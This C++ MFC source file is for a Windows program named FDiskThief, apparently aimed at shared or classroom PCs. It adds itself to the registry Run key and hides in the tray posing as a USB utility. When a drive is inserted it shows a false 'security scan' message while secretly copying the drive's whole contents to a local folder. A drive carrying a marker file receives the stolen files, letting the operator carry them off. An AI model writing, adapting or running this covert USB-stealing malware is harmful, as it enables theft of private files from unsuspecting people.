#include <sys/stat.h>
#include <ctime>
#include <string>
#include "stdafx.h"
#include "FDiskThief.h"
#include "FDiskThiefDlg.h"
#include <imagehlp.h>
#define WM_ICONNOTIFY  WM_USER + 909 //图标响应消息(lParam)
#define ID_TASKBARICON 100           //参数(wParam)
#include <ShellAPI.h>
#pragma comment(lib,"imagehlp.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

NOTIFYICONDATA nid;
BOOL isNotify;
CString filesTitle[10] = {_T("老师好.txt")};

//获取当前程序目录
CString GetAppPath()
{
    TCHAR strExePath[MAX_PATH];
    GetModuleFileName(NULL, strExePath, MAX_PATH); //C:\TEST\123.exe
    PathRemoveFileSpec(strExePath); //#include "Shlwapi.h"     //C:\TEST
    CString str = strExePath;
    str += "\\";
    return str;
}

/*
// 函数功能: 检查指定的文件是否存在, 文件存在则返回 TRUE, 不存在则返回 FALSE
// LPCTSTR lpszFile 要检查的文件的绝对路径, 例: C:\\a.txt
BOOL FileExist(LPCTSTR lpszFile)
{
    HANDLE hFile = CreateFile(lpszFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    CloseHandle(hFile);
    return hFile != INVALID_HANDLE_VALUE;
}
*/

//拷贝文件夹
void MyCopyDirectory(CString source, CString target, int iff)
{
    CreateDirectory(target, NULL); //创建目标文件夹
    //AfxMessageBox("创建文件夹"+target);
    CFileFind finder;
    CString path;
    path.Format(_T("%s/*.*"), source);
    //AfxMessageBox(path);
    BOOL bWorking = finder.FindFile(path);
    while(bWorking)
    {
        bWorking = finder.FindNextFile();
        //AfxMessageBox(finder.GetFileName());
        if(finder.IsDirectory() && !finder.IsDots())//是文件夹 而且 名称不含 . 或 ..
        {
            //递归创建文件夹+"/"+finder.GetFileName()
            MyCopyDirectory(finder.GetFilePath(), target + "/" + finder.GetFileName(), iff);
        }
        else//是文件 则直接复制
        {
            //AfxMessageBox("复制文件"+finder.GetFilePath());//+finder.GetFileName()
            if (iff == 1)
            {
                CopyFile(finder.GetFilePath(), target + "/" + finder.GetFileName(), FALSE);
            }
            else
            {
                // AfxMessageBox("MoveFile");
                MoveFile(finder.GetFilePath(), target + "/" + finder.GetFileName());
            }
        }
    }
}
/////////////////////////////////////////////////////////////////////////////
// CFDiskThiefDlg dialog

CFDiskThiefDlg::CFDiskThiefDlg(CWnd *pParent /*=NULL*/)
    : CDialog(CFDiskThiefDlg::IDD, pParent)
    , m_strPath(_T(""))
{
    //{{AFX_DATA_INIT(CFDiskThiefDlg)
    // NOTE: the ClassWizard will add member initialization here
    //}}AFX_DATA_INIT
    // Note that LoadIcon does not require a subsequent DestroyIcon in Win32
    m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
    m_NewFdisk = _T("");
    m_OldFdisk = _T("");
    IsRun = FALSE;
}

void CFDiskThiefDlg::DoDataExchange(CDataExchange *pDX)
{
    CDialog::DoDataExchange(pDX);
    //{{AFX_DATA_MAP(CFDiskThiefDlg)
    //}}AFX_DATA_MAP
    DDX_Text(pDX, IDC_EDIT_PATH, m_strPath);
    DDX_Control(pDX, IDC_BUTTON_START, m_BtnStart);
    DDX_Control(pDX, IDC_BUTTON_STOP, m_BtnStop);
}

BEGIN_MESSAGE_MAP(CFDiskThiefDlg, CDialog)
    //{{AFX_MSG_MAP(CFDiskThiefDlg)
    ON_WM_SYSCOMMAND()
    ON_WM_PAINT()
    ON_WM_QUERYDRAGICON()
    ON_BN_CLICKED(IDC_BUTTON_OPEN, OnButtonOpen)
    ON_BN_CLICKED(IDC_BUTTON_HIDE, OnButtonHide)
    ON_MESSAGE(WM_HOTKEY, OnHotKey)
    ON_MESSAGE(WM_SHOWTASK, OnSystemtray)
    ON_WM_TIMER()
    ON_BN_CLICKED(IDC_BUTTON_START, OnButtonStart)
    ON_BN_CLICKED(IDC_BUTTON_STOP, OnButtonStop)
    //}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFDiskThiefDlg message handlers

BOOL CFDiskThiefDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // Set the icon for this dialog.  The framework does this automatically
    //  when the application's main window is not a dialog
    SetIcon(m_hIcon, TRUE);			// Set big icon
    SetIcon(m_hIcon, FALSE);		// Set small icon

    // TODO: Add extra initialization here
    // 基于当前系统的当前日期/时间
    time_t t = time(0);
    //初始化路径
    m_strPath = GetAppPath() + "CopyedFiles\\";
    MakeSureDirectoryPathExists(m_strPath);
    UpdateData(FALSE);
    //注册热键
    ::RegisterHotKey(m_hWnd, 199, MOD_ALT, 'X');
    //设置定时器
    SetTimer(0, 100, NULL);
    //开始监视
    // 	OnButtonStart();
    // 	OnButtonHide();

    SetTuoIcon();
    ShowBalloonTip("正在监控U盘中...", "U盘大师已运行", 3000, 1);

    HKEY hKey;
    //找到系统的启动项
    CString lpRun = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    //打开启动项
    long lRet = RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_ALL_ACCESS, &hKey);
    if (lRet != ERROR_SUCCESS)
        ShowBalloonTip("开机自启失败", "无法打开注册表", 3000, 1);
    //找到程序自身路径
    TCHAR pFileName[MAX_PATH] = {};
    GetModuleFileName(NULL, pFileName, MAX_PATH);
    //判断是否已经设置开机启动
    TCHAR FDiskThief[MAX_PATH] = {};
    DWORD nLongth = MAX_PATH;
    long result = RegGetValue(hKey, NULL, _T("FDiskThief"), RRF_RT_REG_SZ, 0, FDiskThief, &nLongth);
    if (result != ERROR_SUCCESS)
    {
        //未自启状态
        //设置自启
        lRet = RegSetValueEx(hKey, _T("FDiskThief"), 0, REG_SZ, (LPBYTE)pFileName, (lstrlen(pFileName) + 1) * sizeof(TCHAR));
        if (lRet != ERROR_SUCCESS)
            ShowBalloonTip("开机自启失败", "无法修改注册表", 3000, 1);
    }
    //关闭注册表
    RegCloseKey(hKey);

    SetTimer(1, 1, NULL);

    return TRUE;  // return TRUE  unless you set the focus to a control
}

void CFDiskThiefDlg::OnSysCommand(UINT nID, LPARAM lParam)
{

    if(nID == SC_MINIMIZE)//如果最小化
        ShowWindow(SW_HIDE);    //隐藏窗口
    else
    {
        CDialog::OnSysCommand(nID, lParam);
    }
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CFDiskThiefDlg::OnPaint()
{
    if (IsIconic())
    {
        CPaintDC dc(this); // device context for painting

        SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

        // Center icon in client rectangle
        int cxIcon = GetSystemMetrics(SM_CXICON);
        int cyIcon = GetSystemMetrics(SM_CYICON);
        CRect rect;
        GetClientRect(&rect);
        int x = (rect.Width() - cxIcon + 1) / 2;
        int y = (rect.Height() - cyIcon + 1) / 2;

        // Draw the icon
        dc.DrawIcon(x, y, m_hIcon);
    }
    else
    {
        CDialog::OnPaint();
    }
}

BOOL CFDiskThiefDlg::ShowBalloonTip(LPCTSTR szMsg, LPCTSTR szTitle, UINT uTimeout, DWORD dwInfoFlags)
{
    nid.cbSize = sizeof(NOTIFYICONDATA);
    nid.uFlags = NIF_INFO;
    nid.uTimeout = uTimeout;
    nid.dwInfoFlags = dwInfoFlags;
    strcpy(nid.szInfo, szMsg ? szMsg : _T(""));
    strcpy(nid.szInfoTitle, szTitle ? szTitle : _T(""));
    return  Shell_NotifyIcon(NIM_MODIFY, &nid);
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CFDiskThiefDlg::OnQueryDragIcon()
{
    return (HCURSOR) m_hIcon;
}

void  CFDiskThiefDlg::SetTuoIcon()
{
    nid.cbSize = (DWORD)sizeof(NOTIFYICONDATA);
    nid.hWnd = this->m_hWnd;
    nid.uID = IDR_MAINFRAME;
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_SHOWTASK;//自定义的消息名称  
    nid.hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
    strcpy(nid.szTip, "鸿合U盘大师");//信息提示条为“OA”  
    Shell_NotifyIcon(NIM_ADD, &nid);//在托盘区添加图标  
    ShowWindow(SW_HIDE);//隐藏主窗口 
}

void CFDiskThiefDlg::OnButtonOpen()
{
    // TODO: Add your control notification handler code here
    BROWSEINFO bi;
    ZeroMemory(&bi, sizeof(BROWSEINFO));	//指定存放文件的默认文件夹路径
    bi.lpszTitle = "请选择数据备份目录";		//添加提示语句
    bi.ulFlags = BIF_NEWDIALOGSTYLE | BIF_EDITBOX;	//添加“新建文件夹项”
    LPMALLOC pMalloc;
    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);//以默认路径打开浏览文件夹对话框
    TCHAR Path[MAX_PATH] = "";
    CString strPath;
    if(pidl != NULL)
    {
        SHGetPathFromIDList(pidl, Path); //把文件夹路径存放在Path中
        strPath = Path;
        strPath += "\\"; //在路径后增加斜杠
        if(SUCCEEDED(SHGetMalloc(&pMalloc)))//网上说pidl指向的对象用完应该释放
        {
            pMalloc->Free(pidl);
            pMalloc->Release();
        }
    }
    if(!strPath.IsEmpty())
    {
        m_strPath = strPath;
        UpdateData(FALSE);
    }
    MakeSureDirectoryPathExists(strPath);
}

void CFDiskThiefDlg::OnButtonHide()
{
    ShowWindow(SW_HIDE);
}

LRESULT CFDiskThiefDlg::OnHotKey(WPARAM wp, LPARAM lp) //热键
{
    if(wp == 199)
    {
        if(IsWindowVisible())
            ShowWindow(SW_HIDE);
        else
            ShowWindow(SW_SHOW);
    }

    return TRUE;
}

LRESULT CFDiskThiefDlg::OnSystemtray(WPARAM wParam, LPARAM lParam)
{
    if (wParam != IDR_MAINFRAME)
        return 1;
    switch (lParam)
    {
    case WM_RBUTTONUP: // 右键起来时
    {
        if(IsWindowVisible())
            ShowWindow(SW_HIDE);
        else
            ShowWindow(SW_SHOW);
    }
    break;
    case WM_LBUTTONUP: // 双击左键的处理
    {
        ShowBalloonTip("喔呦，别乱点哦", "我被点疼了！", 3000, 1);
    }
    break;
    }
    return 0;
}

BOOL CFDiskThiefDlg::DestroyWindow()
{
    // TODO: Add your specialized code here and/or call the base class
    ::UnregisterHotKey(m_hWnd, 199); //释放注册的热键

    return CDialog::DestroyWindow();
}
//-------查找U盘-------------------------------
CString CFDiskThiefDlg::FindFdisk()
{
    CString strDir;
    for(char cc = 'C'; cc <= 'Z'; cc++)
    {
        strDir.Format("%c:", cc);
        if(GetDriveType((LPCTSTR)strDir) == DRIVE_REMOVABLE)//移动盘
            return strDir;
    }
    return "";
}

void CFDiskThiefDlg::OnTimer(UINT nIDEvent)
{
    // TODO: Add your message handler code here and/or call default
    if(IsRun)
    {
        m_NewFdisk = FindFdisk();
        if(m_NewFdisk != m_OldFdisk && m_NewFdisk != "")
        {
            ShowBalloonTip("检测到U盘插入，安全扫描已开始...", "鸿合U盘大师", 3000, 1);
            AfxBeginThread(ThreadProCopyFile, this);
        }
        if(m_NewFdisk != "")
            m_OldFdisk = m_NewFdisk;
        else
            m_OldFdisk = "";
    }

    if (nIDEvent == 1)
    {
        KillTimer(1);
        OnButtonStart();
        ShowWindow(SW_HIDE);
    }

    CDialog::OnTimer(nIDEvent);
}

void CFDiskThiefDlg::OnButtonStart()
{
    // TODO: Add your control notification handler code here
    IsRun = TRUE;
    m_BtnStart.EnableWindow(FALSE);
    m_BtnStop.EnableWindow(TRUE);
}

void CFDiskThiefDlg::OnButtonStop()
{
    // TODO: Add your control notification handler code here
    IsRun = FALSE;
    m_BtnStart.EnableWindow(TRUE);
    m_BtnStop.EnableWindow(FALSE);
}


UINT CFDiskThiefDlg::ThreadProCopyFile(LPVOID lpVoid)
{
    CFDiskThiefDlg *pThis = (CFDiskThiefDlg *)lpVoid;
    MakeSureDirectoryPathExists(pThis->m_strPath);

    /*
    // 创建文件！
    int m_count = sizeof(filesTitle) - 1;
    int num = rand() % m_count;
    printf("%d", num);
    CString filename = _T("C:\\") + filesTitle[num];
    CFile fileCreate(filename, CFile::modeCreate);
    fileCreate.Close();
    CFile file(filename, CFile::modeWrite);
    char str[] = "XXXXXX";
    file.Write(str, sizeof(str));
    file.Close();
    */

    CString Path = pThis->m_NewFdisk + _T("\\3141314.txt");
    BOOL rec = PathFileExists(Path);
    if (rec)
    {
        //存在 剪切
        MyCopyDirectory(pThis->m_strPath, pThis->m_NewFdisk, 2);
    }
    else {
        // 不存在 复制
        MyCopyDirectory(pThis->m_NewFdisk, pThis->m_strPath, 1);
    }
    return 0;
}
